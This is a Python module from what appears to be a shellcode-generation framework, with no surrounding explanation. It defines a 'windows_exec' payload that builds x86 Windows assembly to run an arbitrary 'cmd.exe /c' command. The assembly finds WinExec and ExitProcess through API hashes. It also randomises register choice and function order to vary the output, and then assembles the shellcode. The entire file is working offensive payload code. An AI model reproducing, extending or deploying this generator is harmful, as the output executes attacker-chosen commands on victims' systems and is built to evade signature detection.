from payloads.Engine import Winx86Engine
import random

class WinExec(Winx86Engine):

	def __init__(self, output="a", template=None):
		super().__init__()

		self.info = {
		'Name':'windows_exec',
		'Description':'Execute an arbitrary command',
		'Args':'CMD',
		'Author':'Simone Cardona'
		}

		self.template = template
		self.output = output

	def windows_exec(self, *args):
		self.args = args
		CMD = self.parseOptions()
		exit = super().parseExit()

		# WinExec
		self.hash.append('0x0e8afe98')
		self.calls.append("[ebp+0x04]")

		super().header()
		
		r1 = super().mutexRegister()
		self.registers[r1] = 1
		r2 = super().mutexRegister()
		self.registers[r2] = 1
		r3 = super().mutexRegister()
		self.registers[r3] = 1
		test = r1[1:2] + "l"

		# WinExec
		self.s0 += super().zeroingRegister(r1) + "\n"
		self.s0 += "pop %s\n" % r2
		self.s0 += "push %s\n" % r1
		self.s0 += "mov [%s+%s],%s\n" % (r2,11+len(CMD),test)
		self.s0 += "push %s\n" % r2
		self.s0 += "call %s\n" % self.calls[0]

		if exit != None:
			self.s0 += "jmp ending\n"
		else:
			# ExitProcess
			self.hash.append("0x73e2d87e")
			self.calls.append("[ebp+0x08]")

			self.s0 += "mov edi, [ebp]\n"
			self.s0 += "push" + " " + self.hash[1] + "\n"
			self.s0 += "push" + " " + self.kernel32 + "\n"
			self.s0 += "call find_function\n"
			self.s0 += "mov" + " " + ("%s," % self.calls[1]) + self.returnValue + "\n"	
			self.s0 += super().zeroingRegister("ecx") + "\n"
			self.s0 += "push ecx\n"
			self.s0 += "call %s\n" % self.calls[1]

		self.s1 += 'db "cmd.exe /c %sN"\n' % CMD
		self.s1 += "nop\n" * 2

		rs = [r1,r2,r3]
		super().freeRegisters(rs)
		super().functionRotation()
		super().footer()

		super().assemble(self.output)

	def parseOptions(self):
		for arg in self.args:
			for a in arg:
				if "CMD" in a:
					cmd = a.split("=")[1]
					return cmd